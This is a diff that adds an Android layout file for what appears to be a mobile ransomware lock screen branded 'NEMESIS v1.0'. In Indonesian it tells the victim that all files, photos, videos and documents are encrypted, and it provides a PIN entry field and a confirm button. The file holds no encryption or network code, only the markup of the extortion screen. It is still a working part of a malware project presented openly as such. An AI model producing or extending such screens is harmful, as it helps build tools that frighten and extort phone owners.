@@ -1,1 +1,70 @@
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"
+    android:gravity="center"
+    android:padding="24dp"
+    android:background="#0a0a0a">
 
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="◆ RANSOM ◆"
+        android:textSize="24sp"
+        android:textColor="#ffaa00"
+        android:fontFamily="monospace"
+        android:shadowColor="#ffaa00"
+        android:shadowRadius="20"
+        android:layout_marginBottom="8dp" />
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="⚠️ SEMUA FILE TELAH DIENKRIPSI"
+        android:textColor="#ff0055"
+        android:textSize="14sp"
+        android:textStyle="bold"
+        android:layout_marginBottom="12dp" />
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Foto, video, dokumen terkunci.\nMasukkan PIN untuk konfirmasi."
+        android:textColor="#888"
+        android:textSize="13sp"
+        android:gravity="center"
+        android:layout_marginBottom="12dp" />
+
+    <EditText
+        android:id="@+id/etPin"
+        android:layout_width="match_parent"
+        android:layout_height="56dp"
+        android:hint="Masukkan PIN"
+        android:inputType="numberPassword"
+        android:background="@drawable/input_gold"
+        android:textColor="#fff"
+        android:textSize="16sp"
+        android:gravity="center"
+        android:layout_marginBottom="12dp" />
+
+    <Button
+        android:id="@+id/btnConfirm"
+        android:layout_width="match_parent"
+        android:layout_height="56dp"
+        android:text="✅ KONFIRMASI"
+        android:background="@drawable/btn_gold"
+        android:textColor="#fff"
+        android:textSize="14sp"
+        android:textStyle="bold" />
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="◆ NEMESIS v1.0"
+        android:textSize="10sp"
+        android:textColor="#222"
+        android:fontFamily="monospace"
+        android:layout_marginTop="20dp" />
+
+</LinearLayout>
